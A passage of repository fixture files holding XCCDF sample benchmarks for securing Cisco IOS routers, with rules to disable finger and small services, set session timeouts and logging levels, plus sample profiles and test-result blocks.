         Disable UDP small servers in IOS global config mode.
       </cdf:fixtext>
       <cdf:fix>no service udp-small-servers</cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
          <cdf:check-content-ref href="iosDefns.xml" name="OVAL1001"/>
       </cdf:check>
     </cdf:Rule> 

     <cdf:Rule id="set-buffered-logging-level" selected="1"
               prohibitChanges="0" weight="8.5">
       <cdf:title xml:lang="en">Set the buffered logging level</cdf:title>
       <cdf:description>
          Set the buffered logging level to one of the appropriate
          levels, Warning or higher. Log level should be set explicitly.
       </cdf:description>
       <cdf:question>Check the buffered logging level</cdf:question>
       <cdf:fix>
          logging buffered <cdf:sub idref="buffered-logging-level"/>
       </cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
          <cdf:check-export value-id="buffered-logging-level" 
                            export-name="var-4"/>
          <cdf:check-content-ref href="iosDefns.xml" name="OVAL1301"/>
       </cdf:check>
     </cdf:Rule>
 </cdf:Group>

 <cdf:Group id="data-plane" selected="1" prohibitChanges="1" weight="2">
     <cdf:title>Data Plane Level 1</cdf:title>
     <cdf:description>
          Services and settings related to the data passing through
          the router (as opposed to directed to it). Basically, the
          data plane is for everything not in control or mgmt planes. 
     </cdf:description>
     <cdf:question>Check rules related to data flow</cdf:question>
     
   <cdf:Group id="routing-rules" selected="1" prohibitChanges="1">
     <cdf:title>Routing Rules</cdf:title>
     <cdf:description>
        Rules in this group affect traffic forwarded through the
        router, including router actions taken on receipt of
        special data traffic.
     </cdf:description>
     <cdf:question>Apply standard forwarding protections</cdf:question>
     
   <cdf:Rule id="no-directed-broadcast" weight="7"
             selected="1" prohibitChanges="1">
     <cdf:title>IOS - no directed broadcasts</cdf:title>
     <cdf:description>
         Disable IP directed broadcast on each interface.
     </cdf:description>
     <cdf:question>Forbid IP directed broadcast</cdf:question>
     <cdf:fixtext>
       Disable IP directed broadcast on each interface
       using IOS interface configuration mode.
     </cdf:fixtext>
     <cdf:fix>
        interface <cdf:instance/>
          no ip directed-broadcast
     </cdf:fix>
     <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
        <cdf:check-content-ref href="iosDefns.xml" name="OVAL1101"/>
     </cdf:check>
   </cdf:Rule>
  </cdf:Group>
 </cdf:Group>

  <cdf:Profile id="profile1" prohibitChanges="1">
     <cdf:title>Sample Profile No. 1</cdf:title>
     <cdf:select idref="mgmt-plane" selected="0"/>
     <cdf:select idref="ctrl-plane" selected="1"/>
     <cdf:select idref="finger" selected="1"/>
     <cdf:set-value idref="exec-timeout-time">30</cdf:set-value>
     <cdf:refine-value idref="buffered-logging-level" 
                    selector="lenient"/>
  </cdf:Profile>
  <cdf:Profile id="profile2" extends="profile1">
     <cdf:title>Sample Profile No. 1</cdf:title>
     <cdf:select idref="mgmt-plane" selected="1"/>
     <cdf:select idref="data-plane" selected="1"/>
     <cdf:refine-value idref="buffered-logging-level" selector="strict"/>
  </cdf:Profile>
</cdf:Benchmark>
</file>

<file path="sample_data/test_files/small/scap/ios-sample-1.1.xccdf.xml">
<?xml version="1.0"  encoding="UTF-8"?>
<cdf:Benchmark id="ios-test-1" resolved="0" xml:lang="en"
   xmlns:cdf="http://checklists.nist.gov/xccdf/1.1"
   xmlns:cdfp="http://checklists.nist.gov/xccdf-p/1.0"
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:htm="http://www.w3.org/1999/xhtml"
   xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"
   xsi:schemaLocation="http://checklists.nist.gov/xccdf/1.1 xccdf-1.1_27nov05.xsd http://checklists.nist.gov/xccdf-p/1.0 xccdfp-1.0.xsd">

   <cdf:status date="2005-11-27">draft</cdf:status>
   <cdf:title>XCCDF Sample for Cisco IOS</cdf:title>
   <cdf:description>
     This document defines a small set of rules for securing Cisco 
     IOS routers.  The set of rules constitute a <htm:i>benchmark</htm:i>. 
     A benchmark usually represents an industry consensus of best 
     practices.  It lists steps to be taken as well as rationale for 
     them.  This example benchmark is merely a small subset of the
     rules that would be necessary for securing an IOS router.
   </cdf:description>

   <cdf:notice id="Sample-Terms-Of-Use" xml:lang="en">
      This document may be copied and used subject to the
      subject to the NIST terms of use 
      (http://www.nist.gov/public_affairs/disclaim.htm)
      and the NSA Legal Notices 
      (http://www.nsa.gov/notices/notic00004.cfm?Address=/).
   </cdf:notice>
   <cdf:front-matter>
     <htm:p>
       This benchmark assumes that you are running IOS 11.3 or later.
     </htm:p>
   </cdf:front-matter>
   <cdf:reference href="http://www.nsa.gov/ia/">
     NSA Router Security Configuration Guide, Version 1.1b
   </cdf:reference>
   <cdf:reference>
      <dc:title>Hardening Cisco Routers</dc:title>
      <dc:creator>Thomas Akin</dc:creator>
      <dc:publisher>O'Reilly and Associates</dc:publisher>
      <dc:identifier>http://www.ora.com/</dc:identifier>
   </cdf:reference>

   <cdfp:Platform-Specification>
     <cdfp:Fact name="urn:xccdf:fact:OS"/>
     <cdfp:Fact name="urn:xccdf:fact:OS:IOS">
       <cdfp:title>Cisco IOS</cdfp:title>
     </cdfp:Fact>
     <cdfp:Fact type="number" name="urn:xccdf:fact:OS:MajorVersion"/>
     <cdfp:Fact type="number" name="urn:xccdf:fact:OS:MinorVersion"/>
     <cdfp:Platform id="cisco-ios-12">
       <cdfp:title>Cisco IOS 12</cdfp:title>
       <cdfp:logical-test operator="AND">
         <cdfp:fact-ref name="urn:xccdf:fact:OS:IOS"/>
         <cdfp:fact-test name="urn:xccdf:fact:OS:MajorVersion"
                         operator="equals">
           12
         </cdfp:fact-test>
       </cdfp:logical-test>
     </cdfp:Platform>
     <cdfp:Platform id="cisco-ios-11">
       <cdfp:title>Cisco IOS 12</cdfp:title>
       <cdfp:logical-test operator="AND">
         <cdfp:fact-ref name="urn:xccdf:fact:OS:IOS"/>
         <cdfp:fact-test name="urn:xccdf:fact:OS:MajorVersion"
                         operator="equals">
           11
         </cdfp:fact-test>
       </cdfp:logical-test>
     </cdfp:Platform>
   </cdfp:Platform-Specification>

   <cdf:platform idref="cisco-ios-12"/>
   <cdf:version>0.1.14</cdf:version>
   <cdf:model system="urn:xccdf:scoring:default"/>
   <cdf:model system="urn:xccdf:scoring:flat"/>
   <cdf:model system="urn:bindview.com:scoring:relative">
      <cdf:param name="floor">0.0</cdf:param>
      <cdf:param name="ceiling">1000</cdf:param>
   </cdf:model>
  <cdf:Profile id="profile1" prohibitChanges="1" note-tag="lenient">
     <cdf:title>Sample Profile No. 1</cdf:title>
     <cdf:select idref="mgmt-plane" selected="0"/>
     <cdf:select idref="ctrl-plane" selected="1"/>
     <cdf:select idref="finger" selected="1"/>
     <cdf:set-value idref="exec-timeout-time">30</cdf:set-value>
     <cdf:refine-value idref="buffered-logging-level" 
                    selector="lenient"/>
  </cdf:Profile>
  <cdf:Profile id="profile2" extends="profile1" note-tag="strict">
     <cdf:title override="1">Sample Profile No. 2</cdf:title>
     <cdf:select idref="mgmt-plane" selected="1"/>
     <cdf:select idref="data-plane" selected="1"/>
     <cdf:set-value idref="exec-timeout-time">10</cdf:set-value>
     <cdf:refine-value idref="buffered-logging-level" selector="strict"/>
     <cdf:refine-rule idref="no-tcp-small-servers" 
                      weight="0.8" severity="medium"/>
  </cdf:Profile>


  <cdf:Value id="exec-timeout-time" type="number" 
             operator="less than or equal">
    <cdf:title>IOS - line exec timeout value</cdf:title>
    <cdf:description>
       The length of time, in minutes, that an interactive session
       should be allowed to stay idle before being terminated.  
    </cdf:description>
    <cdf:question>Session exec timeout time (in minutes)</cdf:question>
    <cdf:value>10</cdf:value>
    <cdf:default>15</cdf:default>
    <cdf:lower-bound>1</cdf:lower-bound>
    <cdf:upper-bound>60</cdf:upper-bound>
  </cdf:Value>

  <cdf:Group id="mgmt-plane" selected="1" prohibitChanges="1" weight="3">
     <cdf:title>Management Plane Rules</cdf:title>
     <cdf:description>
       Services, settings, and data streams related tosetting up 
       and examining the static configuration of the router, and the
       authentication and authorization of administrators/operators.
     </cdf:description>
     <cdf:requires idref="no-directed-broadcast"/>
     <cdf:Rule id="no-finger-service-base" selected="0" weight="5.0"
               prohibitChanges="1" hidden="1" abstract="1" cluster-id="finger">
       <cdf:title>IOS - no IP finger service</cdf:title>
       <cdf:description>
         Disable the finger service, it can reveal information
         about logged in users to unauthorized parties.
       </cdf:description>
       <cdf:question>Prohibit the finger service</cdf:question>
       <cdf:fixtext fixref="no-finger" xml:lang="en">
          Turn off the finger service altogether, <htm:i>nobody</htm:i> 
          uses it anyway.
       </cdf:fixtext>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL1002"/>
       </cdf:check>
     </cdf:Rule>

     <cdf:Rule id="ios11-no-finger-service" 
               selected="0" prohibitChanges="1" 
               hidden="0" weight="5" extends="no-finger-service-base">
       <cdf:title override="1">IOS 11 - no IP finger service</cdf:title>
       <cdf:platform idref="cisco-ios-11"/>
       <cdf:fix id="no-finger" system="urn:xccdf:fix:system:commands"
                disruption="low" strategy="disable">
           no service finger
       </cdf:fix>
     </cdf:Rule>

     <cdf:Rule id="ios12-no-finger-service" 
               selected="0" prohibitChanges="1" 
               hidden="0" weight="5" extends="no-finger-service-base">
       <cdf:title override="1">IOS 12 - no IP finger service</cdf:title>
       <cdf:platform idref="cisco-ios-12"/>
       <cdf:fix id="no-finger" system="urn:xccdf:fix:system:commands"
                disruption="low" strategy="disable">
            no ip finger
       </cdf:fix>
     </cdf:Rule>

     <cdf:Rule id="req-exec-timeout" selected="1" weight="8" multiple="1">
       <cdf:title>Require exec timeout on admin sessions</cdf:title>
       <cdf:description>
         Configure each administrative access line to terminate idle
         sessions after a fixed period of time determined by local policy
       </cdf:description>
       <cdf:question>Require admin session idle timeout</cdf:question>
       <cdf:profile-note tag="lenient">
         Half an hour
       </cdf:profile-note>
       <cdf:profile-note tag="strict">
         Ten minutes or less
       </cdf:profile-note>
       <cdf:fix strategy="configure" disruption="low"
                system="urn:xccdf:fix:commands">
           line vty 0 4
           exec-timeout <cdf:sub idref="exec-timeout-time"/>
       </cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
         <cdf:check-export value-id="exec-timeout-time" 
                           export-name="var-2"/>
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL708"/>
       </cdf:check>
     </cdf:Rule>
  </cdf:Group>

  <cdf:Group id="ctrl-plane" selected="1" prohibitChanges="1" weight="3">
     <cdf:title>Control Plane Rules</cdf:title>
     <cdf:description>
          Services, settings, and data streams that support the 
          operation and dynamic status of the router.
     </cdf:description>
     <cdf:question>Check rules related to system control</cdf:question>

     <cdf:Value id="buffered-logging-level" type="string"
                operator="equals" prohibitChanges="0"
                interfaceHint="choice">
       <cdf:title>Logging level for buffered logging</cdf:title>
       <cdf:description>
          Logging level for buffered logging; this setting is
          a severity level.  Every audit message of this
          severity or more (worse) will be logged.
       </cdf:description>
       <cdf:question>Select a buffered logging level</cdf:question>
       <cdf:value selector="strict">informational</cdf:value>
       <cdf:value selector="lenient">warning</cdf:value>
       <cdf:value>notification</cdf:value>
       <cdf:choices mustMatch="1">
          <cdf:choice>warning</cdf:choice>
          <cdf:choice>notification</cdf:choice>
          <cdf:choice>informational</cdf:choice>
       </cdf:choices>
       <cdf:source uri="urn:OS:Cisco:IOS:logging:levels"/>
     </cdf:Value>

     <cdf:Rule id="no-tcp-small-servers" selected="1" 
               prohibitChanges="1" weight="7">
       <cdf:title>Disable tcp-small-servers</cdf:title>
       <cdf:description>
           Disable unnecessary services such as echo, chargen, etc.
       </cdf:description>
       <cdf:question>Prohibit TCP small services</cdf:question>
       <cdf:fixtext>
           Disable TCP small servers in IOS global config mode.
       </cdf:fixtext>
       <cdf:fix>no service tcp-small-servers</cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
          <cdf:check-content-ref href="iosDefns.xml" name="OVAL1000"/>
       </cdf:check>
     </cdf:Rule>

     <cdf:Rule id="no-udp-small-servers" selected="1" role="full"
               prohibitChanges="1" weight="5.7">
       <cdf:title>Disable udp-small-servers</cdf:title>
       <cdf:description>
           Disable unnecessary UDP services such as echo, chargen, etc.
       </cdf:description>
       <cdf:question>Forbid UDP small services</cdf:question>
       <cdf:fixtext>
         Disable UDP small servers in IOS global config mode.
       </cdf:fixtext>
       <cdf:fix>no service udp-small-servers</cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
          <cdf:check-content-ref href="iosDefns.xml" name="OVAL1001"/>
       </cdf:check>
     </cdf:Rule> 

     <cdf:Rule id="enabled-buffered-logging-at-level" selected="1"
               prohibitChanges="0" weight="8.5">
       <cdf:title xml:lang="en">
          Ensure buffered logging enabled at proper level
       </cdf:title>
       <cdf:description>
          Make sure that buffered logging is enabled, and that 
          the buffered logging level to one of the appropriate
          levels, Warning or higher. 
       </cdf:description>
       <cdf:question>Check buffered logging and level</cdf:question>
       <cdf:fix>
          logging on
          logging buffered <cdf:sub idref="buffered-logging-level"/>
       </cdf:fix>
       <cdf:complex-check operator="AND" negate="1">
             <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
                  <cdf:check-export value-id="buffered-logging-level" 
                        export-name="var-4"/>
                  <cdf:check-content-ref href="iosDefns.xml" 
                        name="org.cisecurity.cisco.ios.logging.buf.level"/>
             </cdf:check>
             <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
                  <cdf:check-content-ref href="iosDefns.xml" 
                        name="org.cisecurity.cisco.ios.logging.enabled"/>
             </cdf:check>
       </cdf:complex-check>
     </cdf:Rule>
  </cdf:Group>

  <cdf:Group id="data-plane" selected="1" prohibitChanges="1" weight="2">
     <cdf:title>Data Plane Level 1</cdf:title>
     <cdf:description>
          Services and settings related to the data passing through
          the router (as opposed to directed to it). Basically, the
          data plane is for everything not in control or mgmt planes. 
     </cdf:description>
     <cdf:question>Check rules related to data flow</cdf:question>
     
    <cdf:Group id="routing-rules" selected="1" prohibitChanges="1">
      <cdf:title>Routing Rules</cdf:title>
      <cdf:description>
         Rules in this group affect traffic forwarded through the
         router, including router actions taken on receipt of
         special data traffic.
      </cdf:description>
      <cdf:question>Apply standard forwarding protections</cdf:question>

    <cdf:Rule id="no-directed-broadcast" weight="7" multiple="1"
              selected="1" prohibitChanges="1">
      <cdf:title>IOS - no directed broadcasts</cdf:title>
      <cdf:description>
          Disable IP directed broadcast on each interface.
      </cdf:description>
      <cdf:question>Forbid IP directed broadcast</cdf:question>
      <cdf:fixtext>
        Disable IP directed broadcast on each interface
        using IOS interface configuration mode.
      </cdf:fixtext>
      <cdf:fix>
         interface <cdf:instance context="interface"/>
           no ip directed-broadcast
      </cdf:fix>
      <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL1101"/>
      </cdf:check>
    </cdf:Rule>
   </cdf:Group>
 </cdf:Group>

  <cdf:TestResult id="ios-test-5" 
          end-time="2004-09-25T13:45:02-04:00">
    <cdf:benchmark href="ios-sample-v1.1.xccdf.xml"/>
    <cdf:title>Sample Results Block</cdf:title>
    <cdf:remark>Test run by Bob on Sept 25</cdf:remark>
    <cdf:target>lower.test.net</cdf:target>
    <cdf:target-address>192.168.248.1</cdf:target-address>
    <cdf:target-address>2001:8::1</cdf:target-address>
    <cdf:target-facts>
        <cdf:fact type="string" name="urn:xccdf:fact:ethernet:MAC">
            02:50:e6:c0:14:39
        </cdf:fact>
        <cdf:fact name="urn:xccdf:fact:OS:IOS">1</cdf:fact>
        <cdf:fact type="number" name="urn:xccdf:fact:OS:IOS:major-version">
           12
        </cdf:fact>
        <cdf:fact type="number" name="urn:xccdf:fact:OS:IOS:minor-version">
           3
        </cdf:fact>
        <cdf:fact type="string" name="urn:xccdf:fact:OS:IOS:release">
           12.3(14)T
        </cdf:fact>
    </cdf:target-facts>
    <cdf:set-value idref="exec-timeout-time">10</cdf:set-value>
    <cdf:rule-result idref ="ios12-no-finger-service" 
                     time="2004-09-25T13:45:00-04:00">
        <cdf:result>pass</cdf:result>
    </cdf:rule-result>
    <cdf:rule-result idref ="req-exec-timeout" 
                     time="2004-09-25T13:45:06-04:00">
        <cdf:result>pass</cdf:result>
        <cdf:override time="2004-09-25T13:59:00-04:00"
                   authority="Neal Ziring">
          <cdf:old-result>fail</cdf:old-result>
          <cdf:new-result>pass</cdf:new-result>
          <cdf:remark>Test override</cdf:remark>
        </cdf:override>
        <cdf:instance context="line">console</cdf:instance>
        <cdf:fix>
             line console
             exec-timeout 10 0
        </cdf:fix>
    </cdf:rule-result>
    <cdf:rule-result idref="ios12-no-finger-service">
      <cdf:result>notselected</cdf:result>
    </cdf:rule-result>
    <cdf:score system="urn:xccdf:model:default">67.5</cdf:score>
    <cdf:score system="urn:xccdf:model:flat" maximum="214">157.5</cdf:score>
  </cdf:TestResult>

</cdf:Benchmark>
</file>

<file path="sample_data/test_files/small/scap/ios-sample-v1.1.3.xccdf.xml">
<?xml version="1.0"  encoding="UTF-8"?>
<cdf:Benchmark id="ios-test-1" resolved="0" xml:lang="en"
   xmlns:cdf="http://checklists.nist.gov/xccdf/1.1"
   xmlns:cpe="http://cpe.mitre.org/XMLSchema/cpe/1.0"
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xmlns:htm="http://www.w3.org/1999/xhtml"
   xmlns:dsig="http://www.w3.org/2000/09/xmldsig#"
   xsi:schemaLocation="http://checklists.nist.gov/xccdf/1.1 xccdf-1.1.xsd http://cpe.mitre.org/XMLSchema/cpe/1.0 cpe-1.0.xsd">

   <cdf:status date="2006-12-12">draft</cdf:status>
   <cdf:title>XCCDF Sample for Cisco IOS</cdf:title>
   <cdf:description>
     This document defines a small set of rules for securing Cisco 
     IOS routers. The set of rules constitute a <htm:i>benchmark</htm:i>. 
     A benchmark usually represents an industry consensus of best 
     practices.  It lists steps to be taken as well as rationale for 
     them.  This example benchmark is merely a small subset of the
     rules that would be necessary for securing an IOS router.
   </cdf:description>

   <cdf:notice id="Sample-Terms-Of-Use" xml:lang="en">
      This document may be copied and used subject to the
      subject to the NIST terms of use 
      (http://www.nist.gov/public_affairs/disclaim.htm)
      and the NSA Legal Notices 
      (http://www.nsa.gov/notices/notic00004.cfm?Address=/).
   </cdf:notice>
   <cdf:front-matter>
     <htm:p>
       This benchmark assumes that you are running IOS 11.3 or later.
     </htm:p>
   </cdf:front-matter>
   <cdf:reference href="http://www.nsa.gov/ia/">
     NSA Router Security Configuration Guide, Version 1.1c
   </cdf:reference>
   <cdf:reference>
      <dc:title>Hardening Cisco Routers</dc:title>
      <dc:creator>Thomas Akin</dc:creator>
      <dc:publisher>O'Reilly and Associates</dc:publisher>
      <dc:identifier>http://www.ora.com/</dc:identifier>
   </cdf:reference>

   <cdf:plain-text id="os-name">
     Cisco Internet Operating System (tm)
   </cdf:plain-text>

   <cpe:cpe-list>
     <cpe:cpe-item name="cpe://cisco:ios:12.3">
       <cpe:title>Cisco IOS version 12.3</cpe:title>
     </cpe:cpe-item>
     <cpe:cpe-item name="cpe://cisco:ios:12.2">
       <cpe:title>Cisco IOS version 12.2</cpe:title>
     </cpe:cpe-item>
     <cpe:cpe-item name="cpe://cisco:ios:12.1">
       <cpe:title>Cisco IOS version 12.1</cpe:title>
     </cpe:cpe-item>
     <cpe:cpe-item name="cpe://cisco:ios:12.0">
       <cpe:title>Cisco IOS version 12.0</cpe:title>
     </cpe:cpe-item>
     <cpe:cpe-item name="cpe://cisco:ios:11.3">
       <cpe:title>Cisco IOS version 11.3</cpe:title>
     </cpe:cpe-item>
   </cpe:cpe-list>

   <cdf:platform idref="cpe://cisco:ios:12.3"/>
   <cdf:platform idref="cpe://cisco:ios:12.2"/>
   <cdf:platform idref="cpe://cisco:ios:12.1"/>
   <cdf:platform idref="cpe://cisco:ios:12.0"/>
   <cdf:platform idref="cpe://cisco:ios:11.3"/>
   <cdf:version>0.1.15</cdf:version>
   <cdf:model system="urn:xccdf:scoring:default"/>
   <cdf:model system="urn:xccdf:scoring:flat"/>
   <cdf:model system="urn:bindview.com:scoring:relative">
      <cdf:param name="floor">0.0</cdf:param>
      <cdf:param name="ceiling">1000</cdf:param>
   </cdf:model>
  <cdf:Profile id="profile1" prohibitChanges="1" note-tag="lenient">
     <cdf:title>Sample Profile No. 1</cdf:title>
     <cdf:select idref="mgmt-plane" selected="0"/>
     <cdf:select idref="ctrl-plane" selected="1"/>
     <cdf:select idref="finger" selected="1"/>
     <cdf:set-value idref="exec-timeout-time">30</cdf:set-value>
     <cdf:refine-value idref="buffered-logging-level" 
                    selector="lenient"/>
  </cdf:Profile>
  <cdf:Profile id="profile2" extends="profile1" note-tag="strict">
     <cdf:title override="1">Sample Profile No. 2</cdf:title>
     <cdf:select idref="mgmt-plane" selected="1"/>
     <cdf:select idref="data-plane" selected="1"/>
     <cdf:set-value idref="exec-timeout-time">10</cdf:set-value>
     <cdf:refine-value idref="buffered-logging-level" selector="strict"/>
     <cdf:refine-rule idref="no-tcp-small-servers" 
                      weight="0.8" severity="medium"/>
  </cdf:Profile>


  <cdf:Value id="exec-timeout-time" type="number" 
             operator="less than or equal">
    <cdf:title>IOS - line exec timeout value</cdf:title>
    <cdf:description>
       The length of time, in minutes, that an interactive session
       should be allowed to stay idle before being terminated.  
    </cdf:description>
    <cdf:question>Session exec timeout time (in minutes)</cdf:question>
    <cdf:value>10</cdf:value>
    <cdf:default>15</cdf:default>
    <cdf:lower-bound>1</cdf:lower-bound>
    <cdf:upper-bound>60</cdf:upper-bound>
  </cdf:Value>

  <cdf:Group id="mgmt-plane" selected="1" prohibitChanges="1" weight="3">
     <cdf:title>Management Plane Rules</cdf:title>
     <cdf:description>
       Services, settings, and data streams related tosetting up 
       and examining the static configuration of the router, and the
       authentication and authorization of administrators/operators.
     </cdf:description>
     <cdf:requires idref="no-directed-broadcast no-tcp-small-servers"/>
     <cdf:Rule id="no-finger-service-base" selected="0" weight="5.0"
               prohibitChanges="1" hidden="1" 
	       abstract="1" cluster-id="finger">
       <cdf:title>IOS - no IP finger service</cdf:title>
       <cdf:description>
         Disable the finger service, it can reveal information
         about logged in users to unauthorized parties.
         (For <cdf:sub idref="os-name"/> version 11.3 and later.)
       </cdf:description>
       <cdf:question>Prohibit the finger service</cdf:question>
       <cdf:fixtext fixref="no-finger" xml:lang="en">
          Turn off the finger service altogether,
	  it is <htm:i>very</htm:i> rarely used.
       </cdf:fixtext>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
         <cdf:check-content-ref href="http://oval.mitre.org/repository/find?file=iosDefns.xml" name="OVAL1002"/>
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL1002"/>
       </cdf:check>
     </cdf:Rule>

     <cdf:Rule id="ios11-no-finger-service" 
               selected="0" prohibitChanges="1" 
               hidden="0" weight="5" extends="no-finger-service-base">
       <cdf:title override="1">IOS 11 - no IP finger service</cdf:title>
       <cdf:platform idref="cpe://cisco:ios:11.3"/>
       <cdf:fix id="no-finger" system="urn:xccdf:fix:system:commands"
                disruption="low" strategy="disable">
           no service finger
       </cdf:fix>
     </cdf:Rule>

     <cdf:Rule id="ios12-no-finger-service" 
               selected="0" prohibitChanges="1" 
               hidden="0" weight="5" extends="no-finger-service-base">
       <cdf:title override="1">IOS 12 - no IP finger service</cdf:title>
       <cdf:platform idref="cpe://cisco:ios:12.3"/>
       <cdf:platform idref="cpe://cisco:ios:12.2"/>
       <cdf:platform idref="cpe://cisco:ios:12.1"/>
       <cdf:platform idref="cpe://cisco:ios:12.0"/>
       <cdf:fix id="no-finger" system="urn:xccdf:fix:system:commands"
                disruption="low" strategy="disable">
            no ip finger
       </cdf:fix>
     </cdf:Rule>

     <cdf:Rule id="req-exec-timeout" selected="1" weight="8" multiple="1">
       <cdf:title>Require exec timeout on admin sessions</cdf:title>
       <cdf:description>
         Configure each administrative access line to terminate idle
         sessions after a fixed period of time determined by local policy
       </cdf:description>
       <cdf:question>Require admin session idle timeout</cdf:question>
       <cdf:profile-note tag="lenient">
         Half an hour
       </cdf:profile-note>
       <cdf:profile-note tag="strict">
         Ten minutes or less
       </cdf:profile-note>
       <cdf:fix strategy="configure" disruption="low"
                system="urn:xccdf:fix:commands">
           line vty 0 4
           exec-timeout <cdf:sub idref="exec-timeout-time"/>
       </cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval" id="foo">
         <cdf:check-export value-id="exec-timeout-time" 
                           export-name="var-2"/>
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL708"/>
       </cdf:check>
     </cdf:Rule>
  </cdf:Group>

  <cdf:Group id="ctrl-plane" selected="1" prohibitChanges="1" weight="3">
     <cdf:title>Control Plane Rules</cdf:title>
     <cdf:description>
          Services, settings, and data streams that support the 
          operation and dynamic status of the router.
     </cdf:description>
     <cdf:question>Check rules related to system control</cdf:question>

     <cdf:Value id="buffered-logging-level" type="string"
                operator="equals" prohibitChanges="0"
                interfaceHint="choice">
       <cdf:title>Logging level for buffered logging</cdf:title>
       <cdf:description>
          Logging level for buffered logging; this setting is
          a severity level.  Every audit message of this
          severity or more (worse) will be logged.
       </cdf:description>
       <cdf:question>Select a buffered logging level</cdf:question>
       <cdf:value selector="strict">informational</cdf:value>
       <cdf:value selector="lenient">warning</cdf:value>
       <cdf:value>notification</cdf:value>
       <cdf:choices mustMatch="1">
          <cdf:choice>warning</cdf:choice>
          <cdf:choice>notification</cdf:choice>
          <cdf:choice>informational</cdf:choice>
       </cdf:choices>
       <cdf:source uri="urn:OS:Cisco:IOS:logging:levels"/>
     </cdf:Value>

     <cdf:Rule id="no-tcp-small-servers" selected="1" 
               prohibitChanges="1" weight="7">
       <cdf:title>Disable tcp-small-servers</cdf:title>
       <cdf:description>
           Disable unnecessary services such as echo, chargen, etc.
       </cdf:description>
       <cdf:question>Prohibit TCP small services</cdf:question>
       <cdf:fixtext>
           Disable TCP small servers in IOS global config mode.
       </cdf:fixtext>
       <cdf:fix>no service tcp-small-servers</cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
          <cdf:check-content-ref href="iosDefns.xml" name="OVAL1000"/>
       </cdf:check>
     </cdf:Rule>

     <cdf:Rule id="no-udp-small-servers" selected="1" role="full"
               prohibitChanges="1" weight="5.7">
       <cdf:title>Disable udp-small-servers</cdf:title>
       <cdf:description>
           Disable unnecessary UDP services such as echo, chargen, etc.
       </cdf:description>
       <cdf:question>Forbid UDP small services</cdf:question>
       <cdf:fixtext>
         Disable UDP small servers in IOS global config mode.
       </cdf:fixtext>
       <cdf:fix>no service udp-small-servers</cdf:fix>
       <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
          <cdf:check-content-ref href="iosDefns.xml" name="OVAL1001"/>
       </cdf:check>
     </cdf:Rule> 

     <cdf:Rule id="enabled-buffered-logging-at-level" selected="1"
               prohibitChanges="0" weight="8.5">
       <cdf:title xml:lang="en">
          Ensure buffered logging enabled at proper level
       </cdf:title>
       <cdf:description>
          Make sure that buffered logging is enabled, and that 
          the buffered logging level to one of the appropriate
          levels, Warning or higher. 
       </cdf:description>
       <cdf:question>Check buffered logging and level</cdf:question>
       <cdf:fix>
          logging on
          logging buffered <cdf:sub idref="buffered-logging-level"/>
       </cdf:fix>
       <cdf:complex-check operator="AND" negate="1">
             <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
                  <cdf:check-export value-id="buffered-logging-level" 
                        export-name="var-4"/>
                  <cdf:check-content-ref href="iosDefns.xml" 
                      name="org.cisecurity.cisco.ios.logging.buf.level"/>
             </cdf:check>
             <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
                  <cdf:check-content-ref href="iosDefns.xml" 
                      name="org.cisecurity.cisco.ios.logging.enabled"/>
             </cdf:check>
       </cdf:complex-check>
     </cdf:Rule>
  </cdf:Group>

  <cdf:Group id="data-plane" selected="1" prohibitChanges="1" weight="2">
     <cdf:title>Data Plane Level 1</cdf:title>
     <cdf:description>
          Services and settings related to the data passing through
          the router (as opposed to directed to it). Basically, the
          data plane is for everything not in control or mgmt planes. 
     </cdf:description>
     <cdf:question>Check rules related to data flow</cdf:question>
     
    <cdf:Group id="routing-rules" selected="1" prohibitChanges="1">
      <cdf:title>Routing Rules</cdf:title>
      <cdf:description>
         Rules in this group affect traffic forwarded through the
         router, including router actions taken on receipt of
         special data traffic.
      </cdf:description>
      <cdf:question>Apply standard forwarding protections</cdf:question>

    <cdf:Rule id="no-directed-broadcast" weight="7" multiple="1"
              selected="1" prohibitChanges="1">
      <cdf:title>IOS - no directed broadcasts</cdf:title>
      <cdf:description>
          Disable IP directed broadcast on each interface.
      </cdf:description>
      <cdf:question>Forbid IP directed broadcast</cdf:question>
      <cdf:fixtext>
        Disable IP directed broadcast on each interface
        using IOS interface configuration mode.
      </cdf:fixtext>
      <cdf:fix>
         interface <cdf:instance context="interface"/>
           no ip directed-broadcast
      </cdf:fix>
      <cdf:check system="http://oval.mitre.org/XMLSchema/oval">
         <cdf:check-content-ref href="iosDefns.xml" name="OVAL1101"/>
      </cdf:check>
    </cdf:Rule>
   </cdf:Group>
 </cdf:Group>

  <cdf:TestResult id="ios-test-5" 
          end-time="2004-09-25T13:45:02-04:00">
    <cdf:benchmark href="ios-sample-v1.1.xccdf.xml"/>
    <cdf:title>Sample Results Block</cdf:title>
    <cdf:remark>Test run by Bob on Sept 25</cdf:remark>
    <cdf:target>lower.test.net</cdf:target>
    <cdf:target-address>192.168.248.1</cdf:target-address>
    <cdf:target-address>2001:8::1</cdf:target-address>
    <cdf:target-facts>
        <cdf:fact type="string" name="urn:xccdf:fact:ethernet:MAC">
            02:50:e6:c0:14:39
        </cdf:fact>
